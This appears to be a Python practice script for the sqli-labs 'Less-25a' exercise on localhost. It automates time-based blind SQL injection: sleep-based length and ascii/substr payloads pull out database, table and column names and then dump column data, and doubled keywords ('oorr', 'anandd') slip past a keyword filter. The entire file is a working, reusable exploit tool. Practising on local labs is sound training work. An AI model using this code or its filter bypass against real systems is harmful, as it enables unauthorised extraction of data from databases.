import requests as req
from time import time
from utils.standardHeaders import standardHeader
from utils.normal import sqlForce

from spiderExceptions.sqliExcelptions import ArgumentError

# less25a:None
poc = ''

baseurl = 'http://127.0.0.1:81/Less-25a/?id=1'
sleepTime = 0.3
delayBetweenRequests = 0


def get(url, header=standardHeader):
    res = req.get(url, headers=header)
    return res



def checkRes(startTime, endTime):
    if endTime-startTime < sleepTime:
        return True
    else:
        return False


def bypass(exp, oneTamper):
    bypassDict = {
        'or': 'oorr',
        'and': 'anandd'
    }
    exp = exp.replace(oneTamper, bypassDict[oneTamper])
    return exp


def force(pocUrl, target, tamper, database='', table='', column=''):
    payload = ''
    if target == 'database':
        payload = "(select group_concat(schema_name) from information_schema.schemata)"
    elif target == 'table':
        payload = "(select group_concat(table_name) from information_schema.tables where table_schema=\'{}\')".format(database)
    elif target == 'column':
        payload = "(select group_concat(column_name) from information_schema.columns where table_name='{}')".format(table)
    elif target == 'dump':
        payload = "(select group_concat({}) from {}.{})".format(column, database, table)
    else:
        raise ArgumentError('\'target\'') from None
    print('Forcing all {}s\' length'.format(target))
    for resultLength in range(1, 9999):
        expUrl = pocUrl + ' and if(length({})<{}, sleep({}), 1) -- -'.format(payload, str(resultLength), str(sleepTime))
        for oneTamper in tamper:
            expUrl = bypass(expUrl, oneTamper)
        startTime = time()
        res = get(expUrl)
        endTime = time()
        if not checkRes(startTime, endTime):
            print("{}s length is {}\nForcing each char".format(target, resultLength))
            allData = ''
            payload = " and if(ascii(substr(" + payload + ",{},1))={}, sleep({}), 1) -- -"
            for index in range(1, resultLength + 1):
                for char in sqlForce:
                    expUrl = pocUrl + payload.format(str(index), ord(char), str(sleepTime))
                    for oneTamper in tamper:
                        expUrl = bypass(expUrl, oneTamper)
                    # print(expUrl)
                    startTime = time()
                    res = get(expUrl)
                    endTime = time()
                    if not checkRes(startTime, endTime):
                        allData = allData + char
                        print(allData)
                        break
            return allData


if __name__ == '__main__':
    pocUrl = baseurl + poc
    # okText = 'You are in'
    force(pocUrl, 'database', tamper=['or','and'])
    print('Input a database to force: ', end='')
    database = input()
    force(pocUrl, 'table', tamper=['or','and'], database=database)
    print('Input a table to force: ', end='')
    table = input()
    force(pocUrl, 'column', tamper=['or','and'], database=database, table=table)
    print('Input a column to dump data: ', end='')
    column = input()
    force(pocUrl, 'dump', tamper=['or','and'], database=database, table=table, column=column)
